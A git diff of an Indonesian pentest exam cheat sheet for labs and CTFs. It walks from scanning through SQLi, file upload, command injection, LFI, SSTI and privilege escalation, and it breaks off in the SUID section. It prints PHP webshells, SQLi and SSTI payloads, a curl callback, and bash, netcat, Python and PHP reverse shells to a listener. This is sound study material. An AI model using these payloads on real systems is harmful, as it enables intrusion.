@@ -1,169 +1,289 @@
-# Cyber Kill Chain untuk Ujian Pentester
-> **Ringkasan belajar berbasis repositori `w4h4z/Pentest-Cheat-Sheet`**  
-> Fokus: laboratorium/CTF dan pengujian keamanan yang telah memperoleh izin.
+# Pentest Closed-Book Cheat Sheet
+> **Playbook ujian: Target → Foothold → Root → FLAG**  
+> Untuk laboratorium, CTF, mesin ujian, dan sistem yang telah memberikan izin tertulis.
 
 ---
 
-## 1. Tujuan Dokumen
-
-Dokumen ini merangkum alur serangan praktis dari repositori:
+# 0. Alur Utama yang Harus Dihafal
 
 ```text
-Recon → Initial Foothold → Reverse Shell → Enumeration
-→ Privilege Escalation → Proof
+DISCOVER
+   ↓
+SCAN
+   ↓
+ENUMERATE SERVICE / WEB
+   ↓
+IDENTIFY VULNERABILITY
+   ↓
+INITIAL FOOTHOLD / RCE
+   ↓
+REVERSE SHELL
+   ↓
+STABILIZE TTY
+   ↓
+LOCAL ENUMERATION
+   ↓
+PRIVILEGE ESCALATION
+   ↓
+ROOT
+   ↓
+FIND FLAG
+   ↓
+PROOF
 ```
 
-Alur tersebut merupakan **attack chain praktis untuk penetration testing**, bukan salinan persis tujuh tahap *Lockheed Martin Cyber Kill Chain*. Untuk ujian pentester, alur ini lebih operasional karena langsung menghubungkan temuan, command, bukti, dan keputusan berikutnya.
-
-### Rumus hafalan
+## Mnemonic
 
 ```text
-R-F-S-E-P-P
-Recon → Foothold → Shell → Enumeration → Privilege Escalation → Proof
+D-S-E-F-S-T-E-P-R-F
 ```
 
-Versi bahasa Indonesia:
+```text
+Discover → Scan → Enumerate → Foothold → Shell
+→ TTY → Enumerate Local → PrivEsc → Root → Flag
+```
+
+## Prinsip setiap tahap
 
 ```text
-Cari → Masuk → Sambung → Periksa → Naik Hak Akses → Buktikan
+Temukan → Konfirmasi → Eksploitasi → Verifikasi → Catat
+```
+
+Jangan menjalankan semua command secara acak. Setiap command harus menjawab pertanyaan berikut:
+
+```text
+1. Apa yang tersedia?
+2. Apa yang rentan atau salah konfigurasi?
+3. Bagaimana mengonfirmasinya?
+4. Bagaimana mengubah temuan menjadi akses?
+5. Apakah akses tersebut benar-benar berhasil?
 ```
 
 ---
 
-# 2. Peta Besar Attack Chain
+# 1. Variabel Kerja
 
-| Fase | Pertanyaan Utama | Target Hasil |
-|---|---|---|
-| 1. Reconnaissance | Target hidup? Port dan layanan apa yang terbuka? | IP, port, versi layanan, endpoint |
-| 2. Initial Foothold | Celah apa yang memberi command execution? | RCE/webshell sebagai user layanan |
-| 3. Reverse Shell | Bagaimana memperoleh shell interaktif? | Koneksi target ke Kali |
-| 4. Enumeration | Salah konfigurasi atau kelemahan lokal apa yang tersedia? | Jalur privilege escalation |
-| 5. Privilege Escalation | Bagaimana menjadi root? | `uid=0` atau `euid=0` |
-| 6. Proof | Apa bukti keberhasilan yang wajib dikumpulkan? | Output `id` dan `hostname` |
-
-## Prinsip utama ujian
-
-Jangan melakukan semua command secara acak. Gunakan pola:
-
-```text
-Temukan → Konfirmasi → Eksploitasi → Verifikasi → Dokumentasikan
-```
-
-Contoh:
-
-```text
-Temukan SUID → identifikasi binary → cek GTFOBins
-→ jalankan payload sesuai binary → verifikasi dengan id
-```
-
----
-
-# 3. Fase 1 — Reconnaissance
-
-## 3.1 Tujuan
-
-Recon digunakan untuk:
-
-- menemukan alamat IP target;
-- mengetahui IP Kali untuk `LHOST`;
-- menemukan seluruh port TCP;
-- mengenali versi layanan;
-- mencari direktori, panel admin, upload, backup, dan endpoint tersembunyi.
-
-## 3.2 Network Discovery
+Gunakan variabel agar command lebih mudah diketik dan mengurangi kesalahan.
 
 ```bash
-sudo netdiscover -r 10.0.2.0/24
-nmap -sn 10.0.2.0/24
+TARGET="192.168.56.118"
+LHOST="192.168.56.101"
+LPORT="4444"
+PORT="8080"
+BASE="http://$TARGET:$PORT"
 ```
 
-Cek IP Kali:
+Verifikasi:
+
+```bash
+echo "$TARGET"
+echo "$LHOST"
+echo "$BASE"
+```
+
+## Arti variabel
+
+| Variabel | Arti |
+|---|---|
+| `TARGET` | IP mesin target |
+| `LHOST` | IP Kali yang dapat dijangkau target |
+| `LPORT` | port listener reverse shell |
+| `PORT` | port aplikasi target |
+| `BASE` | base URL aplikasi |
+
+---
+
+# 2. Tahap 1 — Discover Target
+
+## 2.1 Cek IP dan interface Kali
 
 ```bash
 ip a
-ip route
 hostname -I
+ip route
 ```
 
-### Yang harus dicatat
+## 2.2 Temukan host aktif
+
+```bash
+sudo netdiscover -r 192.168.56.0/24
+```
+
+Alternatif:
+
+```bash
+nmap -sn 192.168.56.0/24
+```
+
+## Hasil yang dicatat
 
 ```text
-TARGET = IP mesin target
-LHOST = IP Kali yang dapat dijangkau target
+Kali / LHOST :
+Target        :
+Subnet        :
 ```
 
-Kesalahan umum adalah memasukkan IP NAT, VPN, atau interface yang salah sebagai `LHOST`.
+## Wajib hafal
+
+```bash
+ip a
+nmap -sn 192.168.56.0/24
+```
 
 ---
 
-## 3.3 Port Scanning
+# 3. Tahap 2 — Port Scanning
 
-### Scan utama
+## 3.1 Scan seluruh port TCP
 
 ```bash
-nmap -sV -sC -p- <TARGET>
+nmap -p- --min-rate 5000 -T4 "$TARGET" -oN all-ports.txt
 ```
 
-Arti opsi:
+## 3.2 Scan detail port yang ditemukan
+
+```bash
+nmap -sC -sV -p22,80,8080 "$TARGET" -oN service-scan.txt
+```
+
+## 3.3 Versi satu command
+
+```bash
+nmap -sC -sV -p- "$TARGET"
+```
+
+## Arti opsi
 
 | Opsi | Fungsi |
 |---|---|
-| `-sV` | mendeteksi versi service |
-| `-sC` | menjalankan default NSE scripts |
-| `-p-` | memindai seluruh port TCP 1–65535 |
+| `-p-` | scan port 1–65535 |
+| `-sC` | default NSE scripts |
+| `-sV` | deteksi versi service |
+| `-T4` | mempercepat timing |
+| `--min-rate 5000` | batas minimal packet rate |
+| `-oN` | simpan output normal |
 
-### Scan lebih cepat
+## Interpretasi cepat
+
+| Port | Service umum | Langkah berikutnya |
+|---:|---|---|
+| 21 | FTP | anonymous login, file, credential |
+| 22 | SSH | credential reuse, private key |
+| 80/443 | HTTP/HTTPS | web enumeration |
+| 8000/8080/8081 | web/Tomcat | web enumeration, manager panel |
+| 3306 | MySQL | credential, local-only DB |
+| 5432 | PostgreSQL | credential, local-only DB |
+| 8009 | AJP | Tomcat/AJP check |
+| 10000 | Webmin | version and credential check |
+
+## Wajib hafal
 
 ```bash
-nmap -sV -p- --min-rate 5000 <TARGET>
+nmap -p- --min-rate 5000 -T4 "$TARGET" -oN all-ports.txt
+nmap -sC -sV -p<PORTS> "$TARGET" -oN service-scan.txt
 ```
-
-### Pola yang lebih sistematis
-
-```bash
-# Tahap 1: cari semua port
-nmap -p- --min-rate 5000 -T4 <TARGET> -oN all-ports.txt
-
-# Tahap 2: scan detail port yang ditemukan
-nmap -sC -sV -p<PORT1,PORT2,PORT3> <TARGET> -oN service-scan.txt
-```
-
-### Interpretasi cepat
-
-| Port | Kemungkinan Arah |
-|---:|---|
-| 21 | FTP: anonymous login, file, credential |
-| 22 | SSH: credential/key reuse |
-| 80/443/8000/8080/8081 | aplikasi web |
-| 3306 | MySQL/MariaDB |
-| 5432 | PostgreSQL |
-| 8009 | Tomcat AJP |
-| 8080/8081 | Tomcat atau aplikasi web alternatif |
-| 10000 | Webmin atau panel administrasi |
-
-> Port hanya petunjuk. Verifikasi berdasarkan banner dan hasil `-sV`.
 
 ---
 
-## 3.4 Web Enumeration
+# 4. Tahap 3 — Service Enumeration
+
+Tidak semua target adalah web. Pilih jalur berdasarkan service.
+
+## 4.1 HTTP/HTTPS
 
 ```bash
-dirsearch -u http://<TARGET>:<PORT>/
+curl -I "$BASE"
+curl -s "$BASE"
+```
+
+Cek teknologi:
+
+```bash
+whatweb "$BASE"
+```
+
+Cek robots:
+
+```bash
+curl -s "$BASE/robots.txt"
+```
+
+## 4.2 FTP
+
+```bash
+ftp "$TARGET"
+```
+
+Coba anonymous pada lab:
+
+```text
+Username: anonymous
+Password: anonymous
+```
+
+## 4.3 SSH
+
+```bash
+ssh <USER>@"$TARGET"
+```
+
+Dengan private key:
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa <USER>@"$TARGET"
+```
+
+## 4.4 SMB jika tersedia
+
+```bash
+smbclient -L //"$TARGET"/ -N
+```
+
+```bash
+enum4linux -a "$TARGET"
+```
+
+## 4.5 Banner sederhana
+
+```bash
+nc -nv "$TARGET" <PORT>
+```
+
+---
+
+# 5. Tahap 4 — Web Enumeration
+
+## 5.1 Directory brute force
+
+```bash
+dirsearch -u "$BASE/"
 ```
 
 Alternatif:
 
 ```bash
 feroxbuster \
-  -u http://<TARGET>:<PORT>/ \
+  -u "$BASE/" \
   -w /usr/share/wordlists/dirb/common.txt
+```
 
+```bash
 dirb \
-  http://<TARGET>:<PORT>/ \
+  "$BASE/" \
   /usr/share/wordlists/dirb/common.txt
 ```
 
-### Endpoint bernilai tinggi
+## 5.2 Extension penting
+
+```bash
+feroxbuster \
+  -u "$BASE/" \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x php,txt,bak,old,zip,sql,conf,env
+```
+
+## 5.3 Endpoint bernilai tinggi
 
 ```text
 /admin
@@ -181,50 +301,55 @@ dirb \
 /.env
 ```
 
-### Setelah menemukan endpoint
-
-1. Buka secara manual.
-2. Periksa parameter GET/POST.
-3. Periksa cookie dan session.
-4. Coba input aneh sederhana.
-5. Gunakan Burp Suite untuk menangkap request.
-6. Pilih pengujian berdasarkan fungsi endpoint.
-
-Contoh:
-
-| Fungsi | Pengujian Awal |
-|---|---|
-| Login | SQL injection, default credential |
-| Upload avatar/dokumen | unrestricted file upload |
-| Pencarian/detail dengan `id=` | SQLi, LFI, IDOR |
-| Ping/diagnostic | command injection |
-| Template preview | SSTI |
-| Parameter `page=`/`file=` | LFI/path traversal |
-
----
-
-## 3.5 Checklist Recon
+## 5.4 Checklist manual web
 
 ```text
-[ ] Target hidup
-[ ] TARGET dicatat
-[ ] LHOST dicatat
-[ ] Semua port TCP dipindai
-[ ] Versi layanan dicatat
-[ ] Web pada setiap port HTTP diperiksa
-[ ] robots.txt diperiksa
-[ ] Directory brute force dijalankan
-[ ] Parameter GET/POST penting dicatat
-[ ] Screenshot/hasil scan disimpan
+[ ] Lihat source HTML
+[ ] Cek robots.txt
+[ ] Cek cookie/session
+[ ] Cari komentar developer
+[ ] Catat semua parameter GET
+[ ] Tangkap POST dengan Burp
+[ ] Cari login, upload, search, page/file, ping/diagnostic
+[ ] Cek virtual host dari hostname/banner
+```
+
+## 5.5 Pemetaan fungsi ke pengujian
+
+| Fungsi aplikasi | Pengujian utama |
+|---|---|
+| Login | SQLi, default credential |
+| Search/detail `id=` | SQLi, IDOR |
+| `page=` atau `file=` | LFI/path traversal |
+| Upload avatar/file | unrestricted file upload |
+| Ping/diagnostic | command injection |
+| Template preview | SSTI |
+| Download/export | path traversal, IDOR |
+
+## Wajib hafal
+
+```bash
+dirsearch -u "$BASE/"
 ```
 
 ---
 
-# 4. Fase 2 — Initial Foothold
+# 6. Tahap 5 — Initial Foothold
 
-## 4.1 Tujuan
+Tujuan tahap ini:
 
-Initial foothold berarti memperoleh kemampuan awal menjalankan perintah pada target. User awal biasanya:
+```text
+Input aplikasi → kerentanan → command execution → user layanan
+```
+
+Konfirmasi command execution dengan:
+
+```bash
+id
+whoami
+```
+
+User awal umumnya:
 
 ```text
 www-data
@@ -233,95 +358,228 @@ nginx
 tomcat
 ```
 
-Alur ideal:
-
-```text
-Deteksi kerentanan → konfirmasi aman dengan id
-→ peroleh webshell/RCE → identifikasi user
-```
-
 ---
 
-## 4.2 SQL Injection
+# 7. SQL Injection
 
-### A. Auth Bypass
-
-Payload dasar pada login:
+## 7.1 Payload auth bypass
 
 ```text
 ' OR '1'='1'-- -
+```
+
+```text
 admin'-- -
+```
+
+```text
 ') OR ('1'='1
 ```
 
-### B. Boolean Detection
+## 7.2 Boolean detection
 
 ```text
 ?id=1 AND 1=1
 ?id=1 AND 1=2
 ```
 
-Jika respons berbeda secara konsisten, parameter patut diuji lebih lanjut.
+Jika hasil berbeda secara konsisten, lanjutkan validasi.
 
-### C. SQLMap
+---
 
-Cari database:
+## 7.3 SQLMap GET — Urutan 1 sampai 5
+
+Siapkan URL:
+
+```bash
+URL="$BASE/page?id=1"
+```
+
+### 1. Deteksi SQL Injection
 
 ```bash
 sqlmap \
-  -u "http://<TARGET>:<PORT>/page?id=1" \
-  --batch --dbs
+  -u "$URL" \
+  -p id \
+  --batch
 ```
 
-Cari tabel:
+### 2. Database aktif
 
 ```bash
 sqlmap \
-  -u "http://<TARGET>:<PORT>/page?id=1" \
-  --batch -D <DATABASE> --tables
+  -u "$URL" \
+  -p id \
+  --batch \
+  --current-db
 ```
 
-Dump tabel:
+### 3. Semua database
 
 ```bash
 sqlmap \
-  -u "http://<TARGET>:<PORT>/page?id=1" \
-  --batch -D <DATABASE> -T users --dump
+  -u "$URL" \
+  -p id \
+  --batch \
+  --dbs
 ```
 
-### D. Request POST dari Burp
-
-Simpan request Burp sebagai `request.txt`, lalu:
+### 4. Tabel pada database
 
 ```bash
-sqlmap -r request.txt --batch --dbs
+sqlmap \
+  -u "$URL" \
+  -p id \
+  --batch \
+  -D <DATABASE> \
+  --tables
 ```
 
-### Keputusan setelah SQLi
+### 5. Dump tabel
 
-```text
-SQLi ditemukan
-├─ Ada credential? → login aplikasi/SSH
-├─ Ada hash? → crack offline
-├─ Ada FILE privilege + webroot writable? → tulis webshell
-└─ Tidak ada jalur RCE? → gunakan data sebagai pivot
+```bash
+sqlmap \
+  -u "$URL" \
+  -p id \
+  --batch \
+  -D <DATABASE> \
+  -T <TABLE> \
+  --dump
 ```
 
-### Bukti minimal
+## Versi satu baris GET
 
-```text
-- parameter vulnerable;
-- payload true/false;
-- nama DB atau tabel;
-- credential/hash yang diperoleh;
-- hasil login atau RCE.
+```bash
+sqlmap -u "$URL" -p id --batch
+sqlmap -u "$URL" -p id --batch --current-db
+sqlmap -u "$URL" -p id --batch --dbs
+sqlmap -u "$URL" -p id --batch -D <DATABASE> --tables
+sqlmap -u "$URL" -p id --batch -D <DATABASE> -T <TABLE> --dump
 ```
 
 ---
 
-## 4.3 Unrestricted File Upload
+## 7.4 SQLMap POST Login — Urutan 1 sampai 5
 
-### Webshell PHP paling sederhana
+Siapkan:
+
+```bash
+LOGIN_URL="$BASE/administrator/"
+POST_DATA="username=admin&password=test"
+```
+
+### 1. Deteksi SQL Injection
+
+```bash
+sqlmap \
+  -u "$LOGIN_URL" \
+  --data="$POST_DATA" \
+  -p username \
+  --batch
+```
+
+### 2. Database aktif
+
+```bash
+sqlmap \
+  -u "$LOGIN_URL" \
+  --data="$POST_DATA" \
+  -p username \
+  --batch \
+  --current-db
+```
+
+### 3. Semua database
+
+```bash
+sqlmap \
+  -u "$LOGIN_URL" \
+  --data="$POST_DATA" \
+  -p username \
+  --batch \
+  --dbs
+```
+
+### 4. Tabel pada database
+
+```bash
+sqlmap \
+  -u "$LOGIN_URL" \
+  --data="$POST_DATA" \
+  -p username \
+  --batch \
+  -D <DATABASE> \
+  --tables
+```
+
+### 5. Dump tabel
+
+```bash
+sqlmap \
+  -u "$LOGIN_URL" \
+  --data="$POST_DATA" \
+  -p username \
+  --batch \
+  -D <DATABASE> \
+  -T <TABLE> \
+  --dump
+```
+
+## Versi satu baris POST
+
+```bash
+sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch
+sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch --current-db
+sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch --dbs
+sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch -D <DATABASE> --tables
+sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch -D <DATABASE> -T <TABLE> --dump
+```
+
+---
+
+## 7.5 Request dari Burp
+
+Simpan request sebagai:
+
+```text
+request.txt
+```
+
+Lalu:
+
+```bash
+sqlmap -r request.txt --batch
+sqlmap -r request.txt --batch --current-db
+sqlmap -r request.txt --batch --dbs
+sqlmap -r request.txt --batch -D <DATABASE> --tables
+sqlmap -r request.txt --batch -D <DATABASE> -T <TABLE> --dump
+```
+
+Jika hanya satu parameter yang diuji:
+
+```bash
+sqlmap -r request.txt -p username --batch --dbs
+```
+
+## Pola hafalan SQLMap
+
+```text
+Deteksi → current-db → dbs → tables → dump
+```
+
+```text
+GET  : -u "$URL" -p id
+POST : -u "$LOGIN_URL" --data="$POST_DATA" -p username
+BURP : -r request.txt
+```
+
+> Backslash `\` harus menjadi karakter terakhir pada baris. Jangan menambahkan spasi setelah backslash.
+
+---
+
+# 8. File Upload
+
+## 8.1 PHP webshell sederhana
 
 ```php
 <?php system($_GET['cmd']); ?>
@@ -333,7 +591,7 @@ Alternatif:
 <?php echo shell_exec($_GET['cmd']); ?>
 ```
 
-### Variasi ekstensi
+## 8.2 Variasi extension
 
 ```text
 shell.php
@@ -345,59 +603,58 @@ shell.jpg.php
 shell.pHp
 ```
 
-### Bypass Content-Type
+## 8.3 Content-Type
 
-Di Burp Suite, ubah:
+Di Burp:
 
 ```http
 Content-Type: image/jpeg
 ```
 
-Isi file tetap PHP.
-
-### Bypass magic byte sederhana
-
-Tambahkan pada awal file:
-
-```text
-GIF89a;
-```
-
-Contoh:
+## 8.4 Magic byte sederhana
 
 ```php
 GIF89a;
 <?php system($_GET['cmd']); ?>
 ```
 
-### Uji webshell
+## 8.5 Uji webshell
 
 ```bash
-curl \
-  "http://<TARGET>:<PORT>/uploads/shell.php?cmd=id"
+curl "$BASE/uploads/shell.php?cmd=id"
 ```
 
-### Decision tree upload
+URL encode command:
+
+```bash
+curl -G \
+  --data-urlencode "cmd=id" \
+  "$BASE/uploads/shell.php"
+```
+
+## Decision tree
 
 ```text
-File berhasil diunggah?
-├─ Tidak → periksa extension, MIME, filename, magic byte
-└─ Ya
-   ├─ Lokasi file diketahui? → akses langsung
-   └─ Tidak → enum /uploads, response upload, source HTML
+Upload gagal
+└─ Uji extension, MIME, nama file, magic byte
 
-File dapat diakses?
-├─ Source PHP tampil → server tidak mengeksekusi PHP di folder itu
-├─ 403 → permission/rule server
-├─ 404 → path atau filename berubah
-└─ Output id tampil → RCE berhasil
+Upload berhasil
+├─ Cari lokasi file
+├─ Akses file
+└─ Jalankan id
+
+Output source PHP
+└─ Folder tidak mengeksekusi PHP
+
+Output id
+└─ RCE berhasil
 ```
 
 ---
 
-## 4.4 Command Injection
+# 9. Command Injection
 
-### Separator dasar
+## 9.1 Separator dasar
 
 ```text
 ; id
@@ -410,91 +667,49 @@ $(id)
 %0a id
 ```
 
-### Deteksi blind
+## 9.2 Blind injection
 
 ```text
 ; sleep 5
 ```
 
-Jika respons terlambat mendekati lima detik secara konsisten, ada indikasi command injection.
+## 9.3 Callback HTTP
 
-Callback HTTP:
-
-```text
-; curl http://<LHOST>/$(whoami)
-```
-
-Jalankan server di Kali:
+Di Kali:
 
 ```bash
 python3 -m http.server 8000
 ```
 
-### Urutan pengujian
+Payload:
 
 ```text
-1. Uji separator dengan id
-2. Uji sleep jika output tidak terlihat
-3. Konfirmasi callback HTTP/DNS
-4. Jalankan reverse shell
+; curl http://<LHOST>:8000/$(whoami)
+```
+
+## Urutan hafalan
+
+```text
+id → sleep → callback → reverse shell
 ```
 
 ---
 
-## 4.5 SSTI — Server-Side Template Injection
+# 10. LFI / Path Traversal
 
-### Deteksi lintas template engine
-
-```text
-{{7*7}}
-${7*7}
-#{7*7}
-<%= 7*7 %>
-```
-
-Jika aplikasi menampilkan `49`, ekspresi diproses oleh template engine.
-
-### Jinja2/Flask — konfirmasi RCE
-
-```text
-{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
-```
-
-Alternatif:
-
-```text
-{{ lipsum.__globals__['os'].popen('id').read() }}
-{{ cycler.__init__.__globals__.os.popen('id').read() }}
-```
-
-### Tahapan
-
-```text
-Input direfleksikan
-→ ekspresi matematika dievaluasi
-→ identifikasi template engine
-→ konfirmasi command execution dengan id
-→ reverse shell
-```
-
----
-
-## 4.6 LFI dan Path Traversal
-
-### Path traversal dasar
+## 10.1 Baca `/etc/passwd`
 
 ```text
 ?page=../../../../etc/passwd
+```
+
+Bypass sederhana:
+
+```text
 ?page=....//....//....//etc/passwd
 ```
 
-Null byte hanya relevan pada lingkungan lama:
-
-```text
-?page=../../../../etc/passwd%00
-```
-
-### PHP wrapper untuk membaca source
+## 10.2 PHP filter
 
 ```text
 ?page=php://filter/convert.base64-encode/resource=index.php
@@ -506,7 +721,7 @@ Decode:
 echo '<BASE64>' | base64 -d
 ```
 
-### File penting untuk dibaca
+## 10.3 File bernilai tinggi
 
 ```text
 /etc/passwd
@@ -517,7 +732,21 @@ echo '<BASE64>' | base64 -d
 /home/<USER>/.ssh/id_rsa
 ```
 
-### LFI menuju RCE melalui log poisoning
+## 10.4 Log poisoning pada lab
+
+Inject User-Agent:
+
+```bash
+curl \
+  -A "<?php system(\$_GET['cmd']); ?>" \
+  "$BASE/"
+```
+
+Include log:
+
+```text
+/vuln.php?page=/var/log/apache2/access.log&cmd=id
+```
 
 Lokasi umum:
 
@@ -528,152 +757,87 @@ Lokasi umum:
 /var/log/nginx/error.log
 ```
 
-Inject PHP melalui User-Agent:
+---
 
-```bash
-curl \
-  -A "<?php system(\$_GET['cmd']); ?>" \
-  http://<TARGET>/
-```
+# 11. SSTI
 
-Include log dan eksekusi:
+## 11.1 Deteksi
 
 ```text
-http://<TARGET>/vuln.php?page=/var/log/apache2/access.log&cmd=id
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
 ```
 
-### Syarat log poisoning
+Jika tampil `49`, ekspresi diproses template engine.
+
+## 11.2 Jinja2 command execution
 
 ```text
-[ ] Payload tercatat di log
-[ ] User web dapat membaca log
-[ ] File log diproses sebagai PHP melalui LFI
-[ ] Parameter command tidak difilter
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+```
+
+Alternatif:
+
+```text
+{{ lipsum.__globals__['os'].popen('id').read() }}
+```
+
+## Alur
+
+```text
+Refleksi input → 7*7 = 49 → identifikasi engine
+→ id → reverse shell
 ```
 
 ---
 
-## 4.7 Checklist Initial Foothold
+# 12. Tahap 6 — Reverse Shell
 
-```text
-[ ] Kerentanan dikonfirmasi
-[ ] Payload sederhana menghasilkan perubahan/output
-[ ] Command id berhasil
-[ ] User layanan diketahui
-[ ] Working directory diketahui
-[ ] Metode menuju reverse shell dipilih
-[ ] Request eksploit disimpan
-```
-
----
-
-# 5. Fase 3 — Reverse Shell
-
-## 5.1 Konsep
-
-- **Kali** membuka listener.
-- **Target** melakukan koneksi keluar menuju Kali.
-- `LHOST` harus IP Kali yang dapat dijangkau target.
-- `LPORT` harus sama pada listener dan payload.
-
-Diagram:
-
-```text
-Kali: nc -lvnp 4444
-          ▲
-          │ koneksi dari target
-          │
-Target: bash/python/php reverse shell
-```
-
----
-
-## 5.2 Jalankan Listener Terlebih Dahulu
+## 12.1 Listener harus dijalankan lebih dahulu
 
 ```bash
 nc -lvnp 4444
 ```
 
-Dengan command history:
+Lebih nyaman:
 
 ```bash
 rlwrap nc -lvnp 4444
 ```
 
-Urutan wajib:
-
-```text
-1. Tentukan LHOST
-2. Jalankan listener
-3. Trigger payload
-4. Jangan menutup terminal listener
-```
-
----
-
-## 5.3 Payload Bash
-
-```bash
-bash -i >& /dev/tcp/<LHOST>/4444 0>&1
-```
-
-Jika dipanggil melalui command injection:
+## 12.2 Bash reverse shell
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
 ```
 
-URL-encoded:
-
-```text
-bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<LHOST>/4444%200>%261'
-```
-
----
-
-## 5.4 Payload Netcat
-
-Jika mendukung `-e`:
+## 12.3 Netcat dengan `-e`
 
 ```bash
 nc -e /bin/bash <LHOST> 4444
 ```
 
-Fallback FIFO:
-
-```bash
-rm /tmp/f
-mkfifo /tmp/f
-cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> 4444 > /tmp/f
-```
-
-One-liner:
+## 12.4 Netcat FIFO fallback
 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
 ```
 
----
-
-## 5.5 Payload Python
+## 12.5 Python
 
 ```bash
 python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
 ```
 
----
-
-## 5.6 Payload PHP
+## 12.6 PHP
 
 ```bash
 php -r '$s=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
----
-
-## 5.7 Msfvenom
-
-### WAR untuk Tomcat
+## 12.7 Msfvenom WAR untuk Tomcat
 
 ```bash
 msfvenom \
@@ -684,50 +848,28 @@ msfvenom \
   -o shell.war
 ```
 
-### PHP
+## Wajib hafal
 
 ```bash
-msfvenom \
-  -p php/reverse_php \
-  LHOST=<LHOST> \
-  LPORT=4444 \
-  -f raw \
-  -o shell.php
+nc -lvnp 4444
+bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
 ```
 
-### ELF Linux
-
-```bash
-msfvenom \
-  -p linux/x64/shell_reverse_tcp \
-  LHOST=<LHOST> \
-  LPORT=4444 \
-  -f elf \
-  -o shell.elf
-
-chmod +x shell.elf
-```
-
----
-
-## 5.8 Troubleshooting Reverse Shell
-
-### Tidak ada koneksi
+## Troubleshooting
 
 ```text
-[ ] Listener sudah aktif?
+[ ] Listener aktif?
 [ ] LHOST benar?
 [ ] LPORT sama?
-[ ] Target dapat ping/akses Kali?
-[ ] Firewall memblokir?
-[ ] Payload ter-encode atau dipotong?
-[ ] Binary bash/nc/python/php tersedia?
+[ ] Target bisa mengakses Kali?
+[ ] Karakter &, >, quote ter-encode?
+[ ] Bash/Python/PHP/Netcat tersedia?
 ```
 
-Cek konektivitas dari target:
+Tes dari target:
 
 ```bash
-curl http://<LHOST>:8000/
+curl "http://<LHOST>:8000/"
 ```
 
 Di Kali:
@@ -736,49 +878,11 @@ Di Kali:
 python3 -m http.server 8000
 ```
 
-### Payload Bash gagal
-
-Coba eksplisit:
-
-```bash
-/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
-```
-
-Atau gunakan Python/Netcat/PHP.
-
 ---
 
-# 6. Menstabilkan TTY
+# 13. Tahap 7 — Stabilize TTY
 
-## 6.1 Mengapa perlu?
-
-Shell awal sering tidak mendukung:
-
-- `Ctrl+C`;
-- autocomplete;
-- command history;
-- `clear`;
-- program interaktif;
-- `su`;
-- editor terminal.
-
-## 6.2 Cara cepat
-
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-
-Alternatif:
-
-```bash
-script -qc /bin/bash /dev/null
-/bin/sh -i
-perl -e 'exec "/bin/sh";'
-```
-
-## 6.3 Upgrade TTY yang lebih lengkap
-
-Pada target:
+## Cara cepat
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -790,85 +894,82 @@ Tekan:
 Ctrl+Z
 ```
 
-Pada Kali:
+Di Kali:
 
 ```bash
 stty raw -echo; fg
 ```
 
-Tekan Enter, lalu pada target:
+Tekan Enter, lalu:
 
 ```bash
 export TERM=xterm
 stty rows 40 columns 120
 ```
 
-Untuk mengembalikan terminal Kali jika rusak:
+Jika terminal rusak:
 
 ```bash
 reset
 ```
 
+## Alternatif
+
+```bash
+script -qc /bin/bash /dev/null
+/bin/sh -i
+perl -e 'exec "/bin/sh";'
+```
+
+## Wajib hafal
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
 ---
 
-# 7. Fase 4 — Enumeration
+# 14. Tahap 8 — Local Enumeration
 
-## 7.1 Tujuan
-
-Enumeration bukan sekadar mengumpulkan informasi. Tujuannya adalah menjawab:
+Tujuan:
 
 ```text
-Apa yang dapat dijalankan sebagai root?
-Apa yang dapat saya ubah?
+Apa yang bisa dijalankan sebagai root?
+Apa yang bisa ditulis?
 Credential apa yang bocor?
-Kernel atau service apa yang rentan?
-```
-
-## 7.2 Lima Quick Wins Pertama
-
-Jalankan segera setelah memperoleh shell:
-
-```bash
-id
-sudo -l
-uname -a
-find / -perm -4000 -type f 2>/dev/null
-getcap -r / 2>/dev/null
-```
-
-Kemudian:
-
-```bash
-cat /etc/crontab
-ls -la /etc/cron.d/
+Service internal apa yang tersedia?
+Kernel apa yang digunakan?
 ```
 
 ---
 
-## 7.3 Identitas dan Sistem
+## 14.1 Quick Wins — jalankan lebih dahulu
+
+```bash
+id; sudo -l
+uname -a; cat /etc/os-release
+find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+cat /etc/crontab; ls -la /etc/cron.d/
+```
+
+---
+
+## 14.2 Identitas dan sistem
 
 ```bash
 id
 whoami
 hostname
+pwd
 uname -a
 uname -r
 cat /etc/os-release
 ```
 
-Catat:
-
-```text
-- user dan group;
-- distribusi Linux;
-- versi kernel;
-- hostname;
-- arsitektur.
-```
-
 ---
 
-## 7.4 Sudo Rights
+## 14.3 Sudo
 
 ```bash
 sudo -l
@@ -881,33 +982,31 @@ NOPASSWD
 ALL
 binary tertentu
 wildcard
-environment variable
 LD_PRELOAD
+env_keep
 ```
 
-Jika menemukan binary:
+Pola:
 
 ```text
-cek GTFOBins → bagian Sudo
+sudo -l → nama binary → GTFOBins → bagian Sudo
 ```
 
 ---
 
-## 7.5 SUID dan SGID
-
-SUID:
+## 14.4 SUID
 
 ```bash
